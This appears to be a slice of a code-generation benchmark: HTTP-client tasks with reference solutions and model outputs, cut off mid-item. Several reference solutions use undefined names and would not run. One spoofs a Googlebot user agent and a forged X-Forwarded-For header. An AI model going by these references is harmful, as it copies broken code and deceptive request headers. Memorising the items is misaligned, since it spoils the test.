[
  {
    "Task_id": 10,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, along with request execution and response handling.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that manages a pool of persistent connections to a specified host, improving performance by reusing connections. It handles connection lifecycle, retries, timeouts, and proxy configurations.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target server hostname\n- port: int - The target server port\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Executes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with connection pooling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .response import HTTPResponse\nfrom .exceptions import (\n    EmptyPoolError,\n    ClosedPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    TimeoutError,\n    SSLError,\n    ProxyError,\n    CertificateError,\n    HTTPException,\n    NewConnectionError\n)\nfrom ._collections import HTTPHeaderDict\nfrom .util.queue import LifoQueue\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.request import set_file_position\nfrom .util.response import assert_header_parsing\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except AttributeError:\n            raise ClosedPoolError(self, \"Pool is closed.\")\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except AttributeError:\n            pass\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            assert_header_parsing(httplib_response.msg)\n            return httplib_response\n        except (SocketTimeout, BaseSSLError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_conn = True\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            http_tunnel_required = connection_requires_http_tunnel(\n                self.proxy, self.proxy_config, parsed_url.scheme\n            )\n\n            if not http_tunnel_required:\n                headers = headers.copy()\n                headers.update(self.proxy_headers)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn if not release_conn else None,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (EmptyPoolError, TimeoutError, HTTPException, SocketError, ProtocolError) as e:\n            if conn:\n                conn.close()\n                conn = None\n            raise\n\n        finally:\n            if release_conn and conn:\n                self._put_conn(conn)\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import logging\nimport socket\nfrom http.client import HTTPConnection, HTTPResponse\nfrom queue import LifoQueue, Full, Empty\nfrom time import time\nfrom urllib.parse import urlsplit\n\nlog = logging.getLogger(__name__)\n\nclass Timeout:\n    DEFAULT_TIMEOUT = object()\n\nclass Retry:\n    pass\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries if retries is not None else Retry()\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.strict = strict\n        self.headers = headers or {}\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        log.debug(\"Creating new connection\")\n        return self.ConnectionCls(host=self.host, port=self.port, timeout=self.timeout, **self.conn_kw)\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except Empty:\n            raise Exception(\"No available connection in pool\")\n\n        if conn is None:\n            conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except Full:\n            log.warning(\"Connection pool is full. Closing the connection.\")\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=Timeout.DEFAULT_TIMEOUT, **httplib_request_kw):\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=Timeout.DEFAULT_TIMEOUT, pool_timeout=None, **response_kw):\n        conn = self._get_conn(timeout=pool_timeout)\n        try:\n            response = self._make_request(conn, method, url, timeout=timeout, body=body, headers=headers, **response_kw)\n            return response\n        finally:\n            self._put_conn(conn)\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get_nowait()\n            if conn:\n                conn.close()"
  },
  {
    "Task_id": 100,
    "Instruction": "Task Description: Create a function to download an image from a given URL, process it, and save it locally while tracking download status and file metadata.\n\nFunction Description: The function downloads an image from a specified URL, resizes it, saves it to a local file, and returns metadata about the download process and resulting file. It handles various HTTP scenarios and includes error handling for network issues.\n\nInput:\n- row: [dict] - A dictionary containing:\n  - \"url\": [str] - The URL of the image to download\n  - Other fields will be populated by the function (see Output)\n\nOutput:\n- row: [dict] - The modified input dictionary with added/updated fields:\n  - \"status\": [int] - HTTP status code of the download (200 for success, 408 for timeout/error)\n  - \"file\": [str] - Path to the saved image file\n  - \"mimetype\": [str] - Detected MIME type of the image\n  - \"size\": [int] - Size of the saved file in bytes",
    "Canonical_solution": "import requests\n\nheaders = {\n    \"User-Agent\": \"Googlebot-Image/1.0\",\n    \"X-Forwarded-For\": \"64.18.15.200\",\n}\n\ndef download_image(row):\n    fname = _file_name(row)\n    if os.path.isfile(fname):\n        row[\"status\"] = 200\n        row[\"file\"] = fname\n        row[\"mimetype\"] = magic.from_file(row[\"file\"], mime=True)\n        row[\"size\"] = os.stat(row[\"file\"]).st_size\n        return row\n\n    try:\n        response = requests.get(\n            row[\"url\"], stream=False, timeout=5, allow_redirects=True, headers=headers\n        )\n        row[\"status\"] = response.status_code\n    except Exception as e:\n        row[\"status\"] = 408\n        return row\n\n    if response.ok:\n        try:\n            response.raw.decode_content = True\n            img = resize_img(io.BytesIO(response.content))\n            img.save(fname)\n\n            row[\"mimetype\"] = magic.from_file(fname, mime=True)\n            row[\"size\"] = os.stat(fname).st_size\n        except Exception as e:\n            row[\"status\"] = 408\n\n    row[\"file\"] = fname\n    return row",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import os\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\n\ndef download_and_process_image(row):\n    url = row.get(\"url\")\n    timeout = 10\n    default_status = 408\n    output_dir = \"downloaded_images\"\n    output_file = os.path.join(output_dir, \"image.jpg\")\n\n    if not os.path.exists(output_dir):\n        os.makedirs(output_dir)\n\n    try:\n        response = requests.get(url, timeout=timeout)\n        row[\"status\"] = response.status_code\n\n        if response.status_code == 200:\n            image_data = BytesIO(response.content)\n            image = Image.open(image_data)\n            image = image.resize((800, 600))\n            image.save(output_file, format=image.format)\n            row[\"file\"] = output_file\n            row[\"mimetype\"] = Image.MIME[image.format]\n            row[\"size\"] = os.path.getsize(output_file)\n        else:\n            row[\"status\"] = default_status\n            row[\"file\"] = None\n            row[\"mimetype\"] = None\n            row[\"size\"] = None\n\n    except requests.RequestException:\n        row[\"status\"] = default_status\n        row[\"file\"] = None\n        row[\"mimetype\"] = None\n        row[\"size\"] = None\n\n    return row"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a function that sends audio and transcript files to a server for processing using HTTP POST request and handles the response.\n\nFunction Description: The function `gentle_request` sends a WAV audio file and its corresponding transcript text file to a specified server using an HTTP POST request. It checks if the filenames match, reads the transcript content, and sends both files to the server. The function handles the server response, checks for errors, and optionally prints debug information.\n\nInput:\n- `wav_path` [str] - Path to the WAV audio file to be sent.\n- `txt_path` [str] - Path to the transcript text file corresponding to the audio.\n- `server_addr` [str] - IP address or hostname of the server.\n- `port` [int] - Port number on which the server is listening.\n- `debug` [bool, optional] - If True, prints the server response in JSON format. Default is False.\n\nOutput:\n- `response` [requests.Response or None] - The server's HTTP response object if the request is successful, otherwise None. The response can be parsed for status code, headers, and content.",
    "Canonical_solution": "from docopt import docopt\nfrom glob import glob\nfrom tqdm import tqdm\nimport os.path\nimport requests\nimport numpy as np\n\ndef gentle_request(wav_path,txt_path, server_addr, port, debug=False):\n    print('\\n')\n    response = None\n    wav_name = os.path.basename(wav_path)\n    txt_name = os.path.basename(txt_path)\n    if os.path.splitext(wav_name)[0] != os.path.splitext(txt_name)[0]:\n        print(' [!] wav name and transcript name does not match - exiting...')\n        return response\n    with open(txt_path, 'r', encoding='utf-8-sig') as txt_file:\n        print('Transcript - '+''.join(txt_file.readlines()))\n    with open(wav_path,'rb') as wav_file, open(txt_path, 'rb') as txt_file:\n        params = (('async','false'),)\n        files={'audio':(wav_name,wav_file),\n               'transcript':(txt_name,txt_file),\n               }\n        server_path = 'http://'+server_addr+':'+str(port)+'/transcriptions'\n        response = requests.post(server_path, params=params,files=files)\n        if response.status_code != 200:\n            print(' [!] External server({}) returned bad response({})'.format(server_path, response.status_code))\n    if debug:\n        print('Response')\n        print(response.json())\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import os\nimport requests\n\ndef gentle_request(wav_path, txt_path, server_addr, port, debug=False):\n    if not wav_path.endswith('.wav') or not txt_path.endswith('.txt'):\n        return None\n    if os.path.splitext(os.path.basename(wav_path))[0] != os.path.splitext(os.path.basename(txt_path))[0]:\n        return None\n    try:\n        with open(txt_path, 'r') as f:\n            transcript = f.read()\n    except FileNotFoundError:\n        return None\n    url = f'http://{server_addr}:{port}/transcriptions?async=false'\n    files = {\n        'audio': (os.path.basename(wav_path), open(wav_path, 'rb'), 'audio/wav'),\n        'transcript': (os.path.basename(txt_path), transcript, 'text/plain')\n    }\n    try:\n        response = requests.post(url, files=files)\n        if debug and response.status_code == 200:\n            print(response.json())\n        return response\n    except requests.exceptions.RequestException:\n        return None\n    finally:\n        for file in files.values():\n            file[1].close()"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs HTTP requests using the Python requests library, handling different HTTP methods and processing both requests and responses appropriately.\n\nFunction Description: The function should make HTTP requests to a specified URL using a given HTTP method (GET, POST, PUT, DELETE, etc.). For GET requests, it should ignore any payload, while for other methods it should properly format and send a JSON payload if provided. The function should return the response status code, headers, and body in a structured format, or an error message if the request fails.\n\nInput:\n- method (str): The HTTP method to use (e.g., 'GET', 'POST', 'PUT', 'DELETE').\n- url (str): The target URL for the HTTP request.\n- payload_json (Optional[str]): A JSON string representing the request payload (ignored for GET requests).\n\nOutput:\n- dict: A dictionary containing:\n  - 'status_code' (int): The HTTP response status code.\n  - 'headers' (dict): The response headers as a dictionary.\n  - 'body' (str): The response body as text.\n  - OR 'error' (str): An error message if the request fails.",
    "Canonical_solution": "import os\nimport requests\nfrom typing import Optional\nfrom letta.utils import json_dumps, json_loads\n\ndef http_request(self, method: str, url: str, payload_json: Optional[str] = None):\n    \"\"\"\n    Generates an HTTP request and returns the response.\n\n    Args:\n        method (str): The HTTP method (e.g., 'GET', 'POST').\n        url (str): The URL for the request.\n        payload_json (Optional[str]): A JSON string representing the request payload.\n\n    Returns:\n        dict: The response from the HTTP request.\n    \"\"\"\n    try:\n        headers = {\"Content-Type\": \"application/json\"}\n\n        # For GET requests, ignore the payload\n        if method.upper() == \"GET\":\n            print(f\"[HTTP] launching GET request to {url}\")\n            response = requests.get(url, headers=headers)\n        else:\n            # Validate and convert the payload for other types of requests\n            if payload_json:\n                payload = json_loads(payload_json)\n            else:\n                payload = {}\n            print(f\"[HTTP] launching {method} request to {url}, payload=\\n{json_dumps(payload, indent=2)}\")\n            response = requests.request(method, url, json=payload, headers=headers)\n\n        return {\"status_code\": response.status_code, \"headers\": dict(response.headers), \"body\": response.text}\n    except Exception as e:\n        return {\"error\": str(e)}",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport json\n\ndef http_request(method, url, payload_json=None):\n    try:\n        if method.upper() == 'GET':\n            response = requests.get(url)\n        else:\n            payload = json.loads(payload_json) if payload_json else None\n            if method.upper() == 'POST':\n                response = requests.post(url, json=payload)\n            elif method.upper() == 'PUT':\n                response = requests.put(url, json=payload)\n            elif method.upper() == 'DELETE':\n                response = requests.delete(url, json=payload)\n            else:\n                return {'error': f'Unsupported HTTP method: {method}'}\n        \n        return {\n            'status_code': response.status_code,\n            'headers': dict(response.headers),\n            'body': response.text\n        }\n    except Exception as e:\n        return {'error': str(e)}"
  },
  {
    "Task_id": 105,
    "Instruction": "Based on the reference code provided, I'll create instructions for the functions since the code is organized at the function level rather than class level.\n\nTask Description: Create a set of HTTP client functions in Python to interact with a remote agent service for Bluetooth and system operations.\n\nFunction Description: The functions make HTTP requests to a remote agent and handle responses for various Bluetooth and system operations.\n\nInput: Various parameters depending on the specific function (agent IP, port, JSON data, etc.)\nOutput: Various return values including status codes, error messages, and operation-specific data\n\nDetailed Functions:\n\n1. Function: makeGetRequest(url)\nPurpose: Make a GET request to a specified URL with timeout handling\nInput: url (string) - The URL to send the GET request to\nOutput: tuple (status_code: int, response_text: string) - Returns status code and response text\n\n2. Function: makePostRequest(url, jsonstr)\nPurpose: Make a POST request with JSON data to a specified URL\nInput: \n  - url (string) - The URL to send the POST request to\n  - jsonstr (string) - JSON data to send in the request body\nOutput: tuple (status_code: int, response_text: string) - Returns status code and response text\n\n3. Function: getRemoteBluetoothRunningServices(agentIP, agentPort)\nPurpose: Check Bluetooth service status on remote agent\nInput:\n  - agentIP (string) - IP address of remote agent\n  - agentPort (int/string) - Port number of remote agent\nOutput: tuple (errcode: int, errmsg: string, hasBluetooth: bool, hasUbertooth: bool, spectrumScanRunning: bool, discoveryScanRunning: bool)\n\n4. Function: startRemoteBluetoothDiscoveryScan(agentIP, agentPort, ubertooth)\nPurpose: Start Bluetooth discovery scan on remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\n  - ubertooth (bool) - Whether to use Ubertooth device\nOutput: tuple (errcode: int, errmsg: string)\n\n5. Function: stopRemoteBluetoothDiscoveryScan(agentIP, agentPort)\nPurpose: Stop Bluetooth discovery scan on remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string)\n\n6. Function: getRemoteBluetoothDiscoveryStatus(agentIP, agentPort)\nPurpose: Get status of Bluetooth discovery scan and discovered devices\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string, devices: dict)\n\n7. Function: getRemoteRecordingsFiles(agentIP, agentPort)\nPurpose: Get list of recording files from remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string, filelist: list)\n\n8. Function: delRemoteRecordingFiles(remoteIP, remotePort, filelist)\nPurpose: Delete recording files on remote agent\nInput:\n  - remoteIP (string)\n  - remotePort (int/string)\n  - filelist (list) - List of files to delete\nOutput: tuple (errcode: int, errmsg: string)\n\n9. Function: startRecord(agentIP, agentPort, interface)\nPurpose: Start recording on specified interface of remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\n  - interface (string) - Network interface to record from\nOutput: tuple (errcode: int, errmsg: string)\n\n10. Function: stopRecord(agentIP, agentPort)\nPurpose: Stop recording on remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string)\n\n11. Function: updateRemoteConfig(remoteIP, remotePort, startupCfg, runningCfg, sendRestart)\nPurpose: Update configuration on remote agent\nInput:\n  - remoteIP (string)\n  - remotePort (int/string)\n  - startupCfg (object) - Configuration for startup\n  - runningCfg (object) - Configuration for running state\n  - sendRestart (bool) - Whether to restart agent after update\nOutput: tuple (errcode: int, errmsg: string)",
    "Canonical_solution": "import requests\nimport json\n\ndef makeGetRequest(url):\n    try:\n        response = requests.get(url, timeout=2)\n    except:\n        return -1, \"\"\n\n    if response.status_code != 200:\n        return response.status_code, \"\"\n\n    htmlResponse=response.text\n    return response.status_code, htmlResponse\n\ndef makePostRequest(url, jsonstr):\n    try:\n        response = requests.post(url, data=jsonstr, timeout=2)\n    except:\n        return -1, \"\"\n\n    htmlResponse=response.text\n    return response.status_code, htmlResponse\n\ndef getRemoteBluetoothRunningServices(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/running\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            hasBluetooth = responsedict['hasbluetooth']\n            hasUbertooth = responsedict['hasubertooth']\n            spectrumScanRunning = responsedict['spectrumscanrunning']\n            discoveryScanRunning = responsedict['discoveryscanrunning']\n\n            return errcode, errmsg, hasBluetooth, hasUbertooth, spectrumScanRunning, discoveryScanRunning\n        except:\n            return -1, 'Error parsing response', False, False, False, False\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']', False, False, False, False\n\ndef startRemoteBluetoothDiscoveryScan(agentIP, agentPort, ubertooth):\n    if ubertooth:\n        url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystartp\"\n    else:\n        url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystarta\"\n\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            return errcode, errmsg\n        except:\n            return -1, 'Error parsing response'\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']'\n\ndef stopRemoteBluetoothDiscoveryScan(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystop\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            return errcode, errmsg\n        except:\n            return -1, 'Error parsing response'\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']'\n\ndef getRemoteBluetoothDiscoveryStatus(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystatus\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            tmpDeviceData = responsedict['devices']\n            devices = {}\n            for curDevice in tmpDeviceData:\n                newdevice = BluetoothDevice()\n                try:\n                    newdevice.fromJsondict(curDevice)\n                    devices[newdevice.macAddress] = newdevice\n                except:\n                    pass\n            return errcode, errmsg, devices\n        except:\n            return -1, 'Error parsing response', None\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']', None\n\ndef getRemoteRecordingsFiles(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/system/getrecordings\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            filelist = []\n            try:\n                for curFileDict in responsedict['files']:\n                    curFile = FileSystemFile()\n                    curFile.fromJsondict(curFileDict)\n                    filelist.append(curFile)\n                return 0, \"\", filelist\n            except:\n                return 2, \"Error parsing response: \" + responsestr, None\n        except:\n            return 1, \"Error parsing response: \" + responsestr, None\n    else:\n        return statusCode, 'Received error code: ' + str(statusCode), None\n\ndef delRemoteRecordingFiles(remoteIP, remotePort, filelist):\n    url = \"http://\" + remoteIP + \":\" + str(remotePort) + \"/system/deleterecordings\"\n\n    filedict={}\n    filedict['files'] = filelist\n\n    jsonstr = json.dumps(filedict)\n    statusCode, responsestr = makePostRequest(url, jsonstr)\n\n    errcode = -1\n    errmsg = \"\"\n\n    if statusCode == 200 or statusCode == 400:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errcode = responsedict['errcode']\n                errmsg = responsedict['errmsg']\n            except:\n                if len(responsestr) == 0:\n                    errmsg = \"Error parsing agent response.  Is it still running?\"\n                else:\n                    errmsg = \"Error parsing agent response:\" + responsestr\n        except:\n            if len(responsestr) == 0:\n                errmsg = \"Error parsing agent response.  Is it still running?\"\n            else:\n                errmsg = \"Error parsing agent response:\" + responsestr\n    else:\n        if len(responsestr) == 0:\n            errmsg = \"Error updating remote agent.  Is it still running?\"\n        else:\n            errmsg = \"Error updating remote agent:\" + responsestr\n\n    return errcode, errmsg\n\ndef startRecord(agentIP, agentPort, interface):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/system/startrecord/\" + interface\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errcode = responsedict['errcode']\n                errmsg = responsedict['errmsg']\n                return errcode, errmsg\n            except:\n                return 2, \"Error parsing response: \" + responsestr\n        except:\n            return 1, \"Error parsing response: \" + responsestr\n    else:\n        return statusCode, 'Received error code: ' + str(statusCode)\n\ndef stopRecord(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/system/stoprecord\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errcode = responsedict['errcode']\n                errmsg = responsedict['errmsg']\n                return errcode, errmsg\n            except:\n                return 2, \"Error parsing response: \" + responsestr\n        except:\n            return 1, \"Error parsing response: \" + responsestr\n    else:\n        return statusCode, 'Received error code: ' + str(statusCode)\n\ndef updateRemoteConfig(remoteIP, remotePort, startupCfg, runningCfg, sendRestart=False):\n    url = \"http://\" + remoteIP + \":\" + str(remotePort) + \"/system/config\"\n\n    cfgdict = {}\n    cfgdict['startup'] = startupCfg.toJsondict()\n    cfgdict['running'] = runningCfg.toJsondict()\n\n    if sendRestart:\n        cfgdict['rebootagent'] = True\n\n    jsonstr = json.dumps(cfgdict)\n    statusCode, responsestr = makePostRequest(url, jsonstr)\n\n    errmsg = \"\"\n\n    if statusCode == 200:\n        return 0, \"\"\n    elif statusCode == 400:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errmsg = responsedict['errmsg']\n            except:\n                if len(responsestr) == 0:\n                    errmsg = \"Error parsing agent response.  Is it still running?\"\n                else:\n                    errmsg = \"Error parsing agent response:\" + responsestr\n        except:\n            if len(responsestr) == 0:\n                errmsg = \"Error parsing agent response.  Is it still running?\"\n            else:\n                errmsg = \"Error parsing agent response:\" + responsestr\n    else:\n        if len(responsestr) == 0:\n            errmsg = \"Error updating remote agent.  Is it still running?\"\n        else:\n            errmsg = \"Error updating remote agent:\" + responsestr\n\n        return -1, errmsg",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport json\n\ndef makeGetRequest(url):\n    try:\n        response = requests.get(url, timeout=10)\n        return (response.status_code, response.text)\n    except requests.exceptions.Timeout:\n        return (408, \"Request timed out\")\n    except Exception as e:\n        return (500, str(e))\n\ndef makePostRequest(url, jsonstr):\n    headers = {'Content-Type': 'application/json'}\n    try:\n        response = requests.post(url, data=jsonstr, headers=headers, timeout=10)\n        return (response.status_code, response.text)\n    except requests.exceptions.Timeout:\n        return (408, \"Request timed out\")\n    except Exception as e:\n        return (500, str(e))\n\ndef getRemoteBluetoothRunningServices(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/api/v1/bluetooth/status\"\n    status_code, response_text = makeGetRequest(url)\n    \n    if status_code == 200:\n        try:\n            data = json.loads(response_text)\n            return (0, \"\", data.get('hasBluetooth', False), data.get('hasUbertooth', False),\n                    data.get('spectrumScanRunning', False), data.get('discoveryScanRunning', False))\n        except json.JSONDecodeError:\n            return (1, \"Failed to parse response\", False, False, False, False)\n    else:\n        return (status_code, f\"HTTP error: {response_text}\", False, False, False, False)\n\ndef startRemoteBluetoothDiscoveryScan(agentIP, agentPort, ubertooth):\n    url = f\"http://{agentIP}:{agentPort}/api/v1/bluetooth/discovery/start\"\n    payload = {\"ubertooth\": ubertooth}\n    status_code, response_text = makePostRequest(url, json.dumps(payload))\n    \n    if status_code == 200:\n        return (0, \"\")\n    else:\n        try:\n            data = json.loads(response_text)\n            return (status_code, data.get('error', 'Unknown error'))\n        except json.JSONDecodeError:\n            return (status_code, response_text)\n\ndef stopRemoteBluetoothDiscoveryScan(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/api/v1/bluetooth/discovery/stop\"\n    status_code, response_text = makePostRequest(url, \"{}\")\n    \n    if status_code == 200:\n        return (0, \"\")\n    else:\n        try:\n            data = json.loads(response_text)\n            return (status_code, data.get('error', 'Unknown error'))\n        except json.JSONDecodeError:\n            return (status_code, response_text)\n\ndef getRemoteBluetoothDiscoveryStatus(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/api/v1/bluetooth/discovery/status\"\n    status_code, response_text = makeGetRequest(url)\n    \n    if status_code == 200:\n        try:\n            data = json.loads(response_text)\n            return (0, \"\", data.get('devices', {}))\n        except json.JSONDecodeError:\n            return (1, \"Failed to parse response\", {})\n    else:\n        return (status_code, f\"HTTP error: {response_text}\", {})\n\ndef getRemoteRecordingsFiles(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/api/v1/recordings/files\"\n    status_code, response_text = makeGetRequest(url)\n    \n    if status_code == 200:\n        try:\n            data = json.loads(response_text)\n            return (0, \"\", data.get('files', []))\n        except json.JSONDecodeError:\n            return (1, \"Failed to parse response\", [])\n    else:\n        return (status_code, f\"HTTP error: {response_text}\", [])\n\ndef delRemoteRecordingFiles(remoteIP, remotePort, filelist):\n    url = f\"http://{remoteIP}:{remotePort}/api/v1/recordings/delete\"\n    payload = {\"files\": filelist}\n    status_code, response_text = makePostRequest(url, json.dumps(payload))\n    \n    if status_code == 200:\n        return (0, \"\")\n    else:\n        try:\n            data = json.loads(response_text)\n            return (status_code, data.get('error', 'Unknown error'))\n        except json.JSONDecodeError:\n            return (status_code, response_text)\n\ndef startRecord(agentIP, agentPort, interface):\n    url = f\"http://{agentIP}:{agentPort}/api/v1/recordings/start\"\n    payload = {\"interface\": interface}\n    status_code, response_text = makePostRequest(url, json.dumps(payload))\n    \n    if status_code == 200:\n        return (0, \"\")\n    else:\n        try:\n            data = json.loads(response_text)\n            return (status_code, data.get('error', 'Unknown error'))\n        except json.JSONDecodeError:\n            return (status_code, response_text)\n\ndef stopRecord(agentIP, agentPort):\n    url = 